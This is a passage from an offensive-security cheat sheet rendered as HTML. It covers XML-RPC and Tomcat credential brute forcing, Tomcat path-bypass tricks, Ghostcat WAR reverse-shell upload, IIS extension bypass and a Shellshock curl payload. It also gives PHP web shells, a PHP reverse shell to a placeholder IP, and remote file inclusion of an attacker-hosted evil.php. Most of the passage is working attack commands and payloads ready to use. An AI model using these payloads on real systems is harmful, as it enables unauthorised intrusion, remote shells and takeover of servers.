&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: text/xml'</span> &lt;url&gt;/xmlrpc.php</code></pre></div></div></li> <li>Show method help:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0"?&gt; &lt;methodCall&gt;&lt;methodName&gt;system.methodHelp&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt; &lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt; &lt;/methodCall&gt;'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: text/xml'</span> &lt;url&gt;/xmlrpc.php</code></pre></div></div></li> </ul> <h3 id="protocols--xml-rpc--bruteforce"> <a href="#protocols--xml-rpc--bruteforce" class="anchor-heading" aria-labelledby="protocols--xml-rpc--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="protocols--xml-rpc--bruteforce--hydra"> <a href="#protocols--xml-rpc--bruteforce--hydra" class="anchor-heading" aria-labelledby="protocols--xml-rpc--bruteforce--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h4> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use the simplest method</span>
hydra <span class="nt">-l</span> none <span class="nt">-P</span> &lt;wlist&gt; &lt;ip&gt; https-post-form <span class="s1">'/xmlrpc.php:&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;pfsense.check_firmware_version&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:failed:H=Content-Type\: text/xml'</span>
<span class="c"># You may have to limit concurrency</span>
<span class="c"># to avoid crashing the service:</span>
<span class="c"># -t &lt;n-threads&gt; | -T &lt;n-threads&gt;</span></code></pre></div></div></li> </ul> <h2 id="protocols--ntp"> <a href="#protocols--ntp" class="anchor-heading" aria-labelledby="protocols--ntp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NTP </h2> <h3 id="protocols--ntp--systemd"> <a href="#protocols--ntp--systemd" class="anchor-heading" aria-labelledby="protocols--ntp--systemd"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> systemd </h3> <ul> <li><code>systemd-timesyncd.service</code> controls NTP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Start the daemon</span>
systemctl start systemd-timesyncd.service

<span class="c"># And/or</span>
timedatectl set-ntp <span class="nb">true</span>

<span class="c"># See the time servers</span>
vi /etc/systemd/timesyncd.conf

<span class="c"># Verify the configuration</span>
timedatectl show-timesync <span class="nt">--all</span>

<span class="c"># Add a new server from an interface</span>
timedatectl ntp-servers &lt;iface&gt; &lt;ip&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--ntp--ntpdate"> <a href="#protocols--ntp--ntpdate" class="anchor-heading" aria-labelledby="protocols--ntp--ntpdate"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ntpdate </h3> <ul> <li><a href="http://support.ntp.org/download">Site</a> - Synchronize system with NTP srv<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Does not require system/chrony</span>
ntpdate &lt;ip&gt;</code></pre></div></div></li> </ul> <h1 id="web"> <a href="#web" class="anchor-heading" aria-labelledby="web"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Web </h1> <h2 id="web--certificates"> <a href="#web--certificates" class="anchor-heading" aria-labelledby="web--certificates"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Certificates </h2> <h3 id="web--certificates--crt-sh"> <a href="#web--certificates--crt-sh" class="anchor-heading" aria-labelledby="web--certificates--crt-sh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> crt.sh </h3> <ul> <li><a href="https://crt.sh">Site</a> - Certificate searcher</li> </ul> <h2 id="web--servers"> <a href="#web--servers" class="anchor-heading" aria-labelledby="web--servers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Servers </h2> <h3 id="web--servers--apache-http"> <a href="#web--servers--apache-http" class="anchor-heading" aria-labelledby="web--servers--apache-http"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Apache HTTP </h3> <h4 id="web--servers--apache-http--url-bruteforce---discovery"> <a href="#web--servers--apache-http--url-bruteforce---discovery" class="anchor-heading" aria-labelledby="web--servers--apache-http--url-bruteforce---discovery"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> URL Bruteforce - Discovery </h4> <ul> <li>Wordlists: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Apache.fuzz.txt">Apache.fuzz</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/apache.txt">apache</a></li> <li><a href="https://gitlab.com/kalilinux/packages/dirb/-/tree/kali/master/wordlists">dirb ones</a></li> </ul> </li> <li>Mix them:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Better use duplicut</span>
<span class="nb">sort</span> <span class="nt">-u</span> <span class="k">*</span>.txt <span class="o">&gt;</span> all.txt</code></pre></div></div></li> </ul> <h4 id="web--servers--apache-http--log-poisoning---lfi-to-rce"> <a href="#web--servers--apache-http--log-poisoning---lfi-to-rce" class="anchor-heading" aria-labelledby="web--servers--apache-http--log-poisoning---lfi-to-rce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Log Poisoning - LFI to RCE </h4> <h5 id="web--servers--apache-http--log-poisoning---lfi-to-rce--linux"> <a href="#web--servers--apache-http--log-poisoning---lfi-to-rce--linux" class="anchor-heading" aria-labelledby="web--servers--apache-http--log-poisoning---lfi-to-rce--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h5> <ul> <li>Common log locations:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-- HTTP --
/var/log/httpd/access_log
/var/log/httpd/error_log

-- HTTPS --
/var/log/httpd/ssl_access_log
/var/log/httpd/ssl_error_log
/var/log/httpd/ssl_request_log</code></pre></div></div></li> <li>Check custom locations in: <ul> <li><code>/etc/apache2/envvars</code></li> <li><code>/etc/apache2/apache2.conf</code></li> </ul> </li> <li>Find the default path of the server: <ul> <li><code>/etc/apache2/sites-enabled/000-default.conf</code></li> </ul> </li> </ul> <h3 id="web--servers--apache-tomcat"> <a href="#web--servers--apache-tomcat" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Apache Tomcat </h3> <h4 id="web--servers--apache-tomcat--version-reveal-tricks"> <a href="#web--servers--apache-tomcat--version-reveal-tricks" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--version-reveal-tricks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Version Reveal Tricks </h4> <ul> <li>Tomcat might be susceptible to URL poisoning to allow revealing its version on a 400 Bad Request error</li> <li>For example: <ul> <li><code>&lt;site&gt;/\</code></li> <li><code>&lt;site&gt;/%5c</code></li> </ul> </li> </ul> <h4 id="web--servers--apache-tomcat--url-bruteforce---discovery"> <a href="#web--servers--apache-tomcat--url-bruteforce---discovery" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--url-bruteforce---discovery"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> URL Bruteforce - Discovery </h4> <ul> <li>Wordlists: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/ApacheTomcat.fuzz.txt">ApacheTomcat.fuzz</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/tomcat.txt">tomcat</a></li> <li>Also check the Apache ones</li> </ul> </li> </ul> <h4 id="web--servers--apache-tomcat--url-reveal-tricks"> <a href="#web--servers--apache-tomcat--url-reveal-tricks" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--url-reveal-tricks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> URL Reveal Tricks </h4> <ul> <li>Tomcat may be susceptible to URL poisoning to allow access to forbidden paths</li> <li>For example: <ul> <li><code>&lt;site&gt;/manager/status/..;/html</code></li> <li>Goes to <code>&lt;site&gt;/manager/html</code></li> <li>even if direct access result in 401</li> <li>Also check <code>&lt;site&gt;/manager;/status</code></li> <li>Plus <code>&lt;...&gt;/%252E%252E/manager/status</code></li> <li>And <code>&lt;..&gt;/;param=value/manager/status</code></li> <li>And use it as base for discovery</li> </ul> </li> <li>To upload WAR files in <code>manager/html</code> tamper the POST request with a proxy</li> <li>Or copy the full request from the browser&#8217;s Dev tools in <code>curl</code> format</li> <li>for <code>host-manager/html</code> only UNC works</li> <li>Remember that WAR files should be type <code>java/jsp_shell_reverse_tcp</code> when generating them with <code>msfvenom</code></li> </ul> <h4 id="web--servers--apache-tomcat--jserv---ajp"> <a href="#web--servers--apache-tomcat--jserv---ajp" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--jserv---ajp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> JServ - AJP </h4> <h5 id="web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials"> <a href="#web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce Default Credentials </h5> <ul> <li>First check that the <code>/manager/</code> URI asks for authentication (if it doesn&#8217;t and returns permission denied it won&#8217;t work)<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>w3m http://&lt;ip:port&gt;/manager</code></pre></div></div></li> <li>Get the default credentials from <a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt">SecLists</a> and separate users from passwords:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Users</span>
<span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f1</span> tomcat-betterdefaultpasslist.txt | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt

<span class="c"># Passwords</span>
<span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f2</span> tomcat-betterdefaultpasslist.txt | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> passwords.txt</code></pre></div></div></li> <li>Bruteforce the credentials with <a href="https://github.com/hypn0s/AJPy">AJPy</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 tomcat.py <span class="nt">--port</span> &lt;ajp-port&gt; bf <span class="nt">-U</span> users.txt <span class="nt">-P</span> passwords.txt /manager/ &lt;ip&gt;
<span class="c"># Maybe also check the HTTP port</span>
<span class="c"># and under /manager/html</span></code></pre></div></div></li> <li>Check that the credentials are indeed valid:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 tomcat.py <span class="nt">--port</span> &lt;ajp-port&gt; list <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; &lt;ip&gt;
<span class="c"># Maybe also check the HTTP port</span></code></pre></div></div></li> </ul> <h5 id="web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938"> <a href="#web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938" class="anchor-heading" aria-labelledby="web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ghostcat - CVE-2020-1938 </h5> <ul> <li>It is possible to upload files with <a href="https://github.com/hypn0s/AJPy">AJPy</a> if permissions to access <code>/manager/</code> are obtained (prior section):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create a .war java reverse shell</span>
python2 tomcat.py <span class="nt">--port</span> &lt;ajp-port&gt; upload <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; &lt;shell&gt;.war &lt;ip&gt;
<span class="c"># Maybe also check the HTTP port</span></code></pre></div></div></li> <li>Check that the shell was deployed:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 tomcat.py <span class="nt">--port</span> &lt;ajp-port&gt; list <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; &lt;ip&gt;
<span class="c"># Maybe also check the HTTP port</span></code></pre></div></div></li> <li>Now execute the remote shell:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># I couldn't check this, possibly</span>
<span class="c"># you can find it installed under</span>
<span class="c"># http://&lt;ip&gt;/manager/html/&lt;app&gt;</span>
<span class="c"># Or maybe this works:</span>
python2 tomcat.py <span class="nt">--port</span> &lt;ajp-port&gt; read_file <span class="nt">--webapp</span><span class="o">=</span>&lt;app&gt; / &lt;ip&gt;</code></pre></div></div></li> <li>Metasploit <code>tomcat_mgr_upload</code> module worked with the HTTP port, but I couldn&#8217;t make <code>AJPy</code> work (with AJP port)</li> <li>Note that the .war can be manually uploaded at <code>http://&lt;ip&gt;/manager/html</code></li> </ul> <h3 id="web--servers--iis"> <a href="#web--servers--iis" class="anchor-heading" aria-labelledby="web--servers--iis"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IIS </h3> <h4 id="web--servers--iis--file-dir-disclosure"> <a href="#web--servers--iis--file-dir-disclosure" class="anchor-heading" aria-labelledby="web--servers--iis--file-dir-disclosure"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> File/Dir Disclosure </h4> <h5 id="web--servers--iis--file-dir-disclosure--short-name-enumerator"> <a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator" class="anchor-heading" aria-labelledby="web--servers--iis--file-dir-disclosure--short-name-enumerator"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Short Name Enumerator </h5> <h6 id="web--servers--iis--file-dir-disclosure--short-name-enumerator--sns"> <a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator--sns" class="anchor-heading" aria-labelledby="web--servers--iis--file-dir-disclosure--short-name-enumerator--sns"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> sns </h6> <ul> <li><a href="https://github.com/sw33tLie/sns">Site</a> - Go IIS shortname scanner:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add headers through --proxy &lt;http&gt;</span>
sns <span class="nt">-c</span> <span class="nt">-u</span> &lt;url&gt;
<span class="c"># -t &lt;n&gt; - Limit threads: 1 -&gt; safest</span>

<span class="c"># Multiple urls</span>
sns <span class="nt">-c</span> <span class="nt">-f</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'&lt;url1&gt;\n&lt;url2&gt;'</span><span class="o">)</span></code></pre></div></div></li> </ul> <h6 id="web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner"> <a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner" class="anchor-heading" aria-labelledby="web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IIS shortname Scanner </h6> <ul> <li><a href="https://github.com/lijiejie/IIS_shortname_Scanner">Site</a> - Python IIS shortname scanner:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py &lt;url&gt;</code></pre></div></div></li> </ul> <h4 id="web--servers--iis--file-extension-bypass"> <a href="#web--servers--iis--file-extension-bypass" class="anchor-heading" aria-labelledby="web--servers--iis--file-extension-bypass"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> File Extension Bypass </h4> <h5 id="web--servers--iis--file-extension-bypass--information"> <a href="#web--servers--iis--file-extension-bypass--information" class="anchor-heading" aria-labelledby="web--servers--iis--file-extension-bypass--information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Information </h5> <ul> <li>Issue only existing in IIS &lt;= 6</li> <li><a href="https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/">Reference</a></li> </ul> <h5 id="web--servers--iis--file-extension-bypass--attack"> <a href="#web--servers--iis--file-extension-bypass--attack" class="anchor-heading" aria-labelledby="web--servers--iis--file-extension-bypass--attack"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Attack </h5> <ul> <li>Use a semicolon in the extension:<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="n">file</span>&gt;.<span class="n">asp</span>;.<span class="n">jpg</span>
<span class="err">#</span> <span class="n">Executed</span>/<span class="n">Saved</span> <span class="n">as</span> &lt;<span class="n">file</span>&gt;.<span class="n">asp</span></code></pre></div></div></li> </ul> <h2 id="web--technologies"> <a href="#web--technologies" class="anchor-heading" aria-labelledby="web--technologies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Technologies </h2> <h3 id="web--technologies--cgi"> <a href="#web--technologies--cgi" class="anchor-heading" aria-labelledby="web--technologies--cgi"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CGI </h3> <h4 id="web--technologies--cgi--shellshock---cve-2014-6271"> <a href="#web--technologies--cgi--shellshock---cve-2014-6271" class="anchor-heading" aria-labelledby="web--technologies--cgi--shellshock---cve-2014-6271"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shellshock - CVE-2014-6271 </h4> <ul> <li>Find the CGI login page (ie: <code>/session_login.cgi</code>) and identify one of the post fields (like <code>user</code>)</li> <li>Pay attention to the headers in place</li> <li>Perform a common login POST request using a <code>sleep</code> as User-Agent:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span> <span class="o">}</span><span class="p">;</span><span class="nb">sleep </span>10
<span class="c"># In some cases sleep 10 alone works</span></code></pre></div></div></li> <li>With <code>curl</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -A '...' or -H 'User-Agent: &lt;cmd&gt;'</span>
<span class="c"># Remove -s if curl errors to check</span>
curl <span class="nt">-A</span> <span class="s1">'() { :; };sleep 10'</span> <span class="nt">-H</span> <span class="s1">'Cookie: testing=1; sid=x'</span> <span class="nt">-s</span> <span class="s1">'https://&lt;ip-port&gt;/session_login.cgi'</span> <span class="nt">-d</span> <span class="s1">'user=test'</span> | w3m <span class="nt">-T</span> text/html <span class="nt">-dump</span>
<span class="c"># -H "Cookie: ..." to bypass the:</span>
<span class="c">#  Error - No cookies</span></code></pre></div></div></li> <li>May be easier with burp or mitmproxy</li> <li><b>Important:</b> Only builtins may be available, <b>PATH</b> is unset, use <b>full path</b></li> <li>Note that any other script in the <code>/cgi-bin/</code> folder may also be susceptible to shellshock</li> <li>Scripts there may even set a <code>text/x-sh</code> header (or broken ones), so add an <code>echo;</code> before the test command</li> </ul> <h3 id="web--technologies--php"> <a href="#web--technologies--php" class="anchor-heading" aria-labelledby="web--technologies--php"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PHP </h3> <h4 id="web--technologies--php--login-bypass"> <a href="#web--technologies--php--login-bypass" class="anchor-heading" aria-labelledby="web--technologies--php--login-bypass"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Login Bypass </h4> <h5 id="web--technologies--php--login-bypass--array"> <a href="#web--technologies--php--login-bypass--array" class="anchor-heading" aria-labelledby="web--technologies--php--login-bypass--array"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Array </h5> <ul> <li>Array types may break the form validation logic</li> <li>Simply change the form fields/params <ul> <li>from <code>user=&lt;user&gt;</code></li> <li>to <code>user[]=&lt;user&gt;</code></li> </ul> </li> <li>Try changing only one at a time</li> </ul> <h4 id="web--technologies--php--code-execution"> <a href="#web--technologies--php--code-execution" class="anchor-heading" aria-labelledby="web--technologies--php--code-execution"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Code Execution </h4> <h5 id="web--technologies--php--code-execution--system-commands"> <a href="#web--technologies--php--code-execution--system-commands" class="anchor-heading" aria-labelledby="web--technologies--php--code-execution--system-commands"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> System Commands </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;?</span><span class="n">php</span> <span class="err">$</span><span class="n">out</span><span class="o">=</span><span class="n">shell_exec</span><span class="p">(</span><span class="s">"&lt;cmd&gt; 2&gt;&amp;1"</span><span class="p">);</span> <span class="n">echo</span> <span class="s">"&lt;pre&gt;$out&lt;/pre&gt;"</span><span class="p">;</span> <span class="o">?&gt;</span>

<span class="c1">// Using GET cmd parameter</span>
<span class="o">&lt;?</span><span class="n">php</span> <span class="n">echo</span> <span class="s">"&lt;pre&gt;"</span> <span class="p">.</span> <span class="n">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">"cmd"</span><span class="p">]</span> <span class="p">.</span> <span class="s">" 2&gt;&amp;1"</span><span class="p">)</span> <span class="p">.</span> <span class="s">"&lt;/pre&gt;"</span><span class="p">;</span> <span class="o">?&gt;</span>

<span class="c1">// Using base64</span>
<span class="o">&lt;?</span><span class="n">php</span> <span class="n">echo</span> <span class="s">"&lt;pre&gt;"</span> <span class="p">.</span> <span class="n">shell_exec</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">"cmd"</span><span class="p">]))</span> <span class="p">.</span> <span class="s">"&lt;/pre&gt;"</span><span class="p">;</span> <span class="o">?&gt;</span>
<span class="c1">// $_REQUEST is "like" $_GET + $_POST</span></code></pre></div></div> <h5 id="web--technologies--php--code-execution--bind-reverse-shells"> <a href="#web--technologies--php--code-execution--bind-reverse-shells" class="anchor-heading" aria-labelledby="web--technologies--php--code-execution--bind-reverse-shells"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bind/Reverse Shells </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Reverse Shell</span>
<span class="o">&lt;?</span><span class="n">php</span> <span class="err">$</span><span class="n">sock</span><span class="o">=</span><span class="n">fsockopen</span><span class="p">(</span><span class="s">"&lt;ip&gt;"</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span><span class="p">);</span> <span class="n">exec</span><span class="p">(</span><span class="s">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span><span class="p">);</span> <span class="o">?&gt;</span>
<span class="c1">// Use passthru with raw output</span>
<span class="c1">// Use pipes with popen or proc_open</span></code></pre></div></div> <h5 id="web--technologies--php--code-execution--protocol-wrappers"> <a href="#web--technologies--php--code-execution--protocol-wrappers" class="anchor-heading" aria-labelledby="web--technologies--php--code-execution--protocol-wrappers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Protocol Wrappers </h5> <ul> <li><a href="https://www.php.net/manual/en/wrappers.php">Docs</a> - RCE through HTTP parameters:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Plain text</span>
&lt;url&gt;?file<span class="o">=</span>data://text/plain,&lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="s2">"&lt;cmd&gt;"</span><span class="o">)</span><span class="p">;</span> ?&gt;
<span class="c"># Also try data://text/plain,[...]</span>

<span class="c"># Base64</span>
&lt;url&gt;?file<span class="o">=</span>data://text/plain<span class="p">;</span><span class="nb">base64</span>,&lt;base64payload&gt;</code></pre></div></div></li> <li>LFI through HTTP parameters:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;url&gt;?file<span class="o">=</span>/etc/passwd

<span class="c"># or forcing file</span>
&lt;url&gt;?file<span class="o">=</span>file:///etc/passwd

<span class="c"># SMB shares can be opened</span>
&lt;url&gt;?file<span class="o">=</span><span class="se">\\</span>&lt;ip&gt;<span class="se">\s</span>hare<span class="se">\e</span>vil.php</code></pre></div></div></li> <li>RFI/RFE through HTTP parameters:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;url&gt;?file<span class="o">=</span>http://&lt;domain/evil.php

<span class="c"># or using php filter</span>
&lt;url&gt;?file<span class="o">=</span>php://filter/resource<span class="o">=</span>http://&lt;domain/evil.php

<span class="c"># or using ssh2, ftp, etc</span></code></pre></div></div></li> <li><a href="https://www.php.net/manual/en/wrappers.expect.php">Expect</a> wrapper also allows cmd exec:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test netcat, space is $IFS</span>
expect://nc<span class="nv">$IFS10</span>.0.0.1<span class="nv">$IFS8080</span></code></pre></div></div></li> </ul> <h4 id="web--technologies--php--file-upload"> <a href="#web--technologies--php--file-upload" class="anchor-heading" aria-labelledby="web--technologies--php--file-upload"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> File Upload </h4> <h5 id="web--technologies--php--file-upload--phpinfo---info-php"> <a href="#web--technologies--php--file-upload--phpinfo---info-php" class="anchor-heading" aria-labelledby="web--technologies--php--file-upload--phpinfo---info-php"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PHPINFO - info.php </h5> <ul> <li>Note that this is a temporary upload</li> <li>First check that <code>file_uploads = On</code></li> <li>Perform a POST request to <code>info.php</code>:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST &lt;uri&gt;/info.php HTTP/1.1
Host: &lt;domain/ip&gt;
User-Agent: Test
Cookie: PHPSESSID=&lt;sess-id&gt;
Content-Length: &lt;body-len+newlines&gt;
Content-Type: &lt;type&gt;

&lt;body&gt;</code></pre></div></div></li> <li><code>&lt;type&gt;</code> and <code>&lt;body&gt;</code> may have to be <code>multipart/form</code>:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Type: multipart/form-data; boundary=---------------&lt;keyword&gt;

---------------&lt;keyword&gt;
Content-Disposition: form-data; name="&lt;var&gt;"; filename="test.txt" Content-Type: text/plainSecurity
&lt;file-content&gt;
---------------&lt;keyword&gt;</code></pre></div></div></li> <li>If phpinfo displays the temporary location of the file, leverage a LFI to RCE with this path</li> <li>Scripts to improve the success rate as the files live for a few seconds: <ul> <li><a href="https://github.com/sinsinsecurity/phpinfo-Local-File-Inclusion">phpinfo-Local-File-Inclusion</a></li> <li><a href="https://github.com/roughiz/lfito_rce">lfito_rce</a></li> <li><a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">phpinfolfi.py</a> (original)</li> </ul> </li> </ul> <h4 id="web--technologies--php--object-injection"> <a href="#web--technologies--php--object-injection" class="anchor-heading" aria-labelledby="web--technologies--php--object-injection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Object Injection </h4> <ul> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md">See</a> - PHP objects can be serialized and included in vulnerable applications (see the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar">phar wrapper</a>)</li> <li>Leverage destructors, function calls, etc using user-controlled code to perform RCE</li> </ul> <h3 id="web--technologies--xml"> <a href="#web--technologies--xml" class="anchor-heading" aria-labelledby="web--technologies--xml"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XML </h3> <h4 id="web--technologies--xml--injection"> <a href="#web--technologies--xml--injection" class="anchor-heading" aria-labelledby="web--technologies--xml--injection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Injection </h4> <h5 id="web--technologies--xml--injection--notes"> <a href="#web--technologies--xml--injection--notes" class="anchor-heading" aria-labelledby="web--technologies--xml--injection--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h5> <ul> <li>When injecting the XML, note that the DOCTYPE or ELEMENT may need to be defined before XML tags</li> </ul> <h5 id="web--technologies--xml--injection--xss"> <a href="#web--technologies--xml--injection--xss" class="anchor-heading" aria-labelledby="web--technologies--xml--injection--xss"><svg viewBox="0 0 16 16" 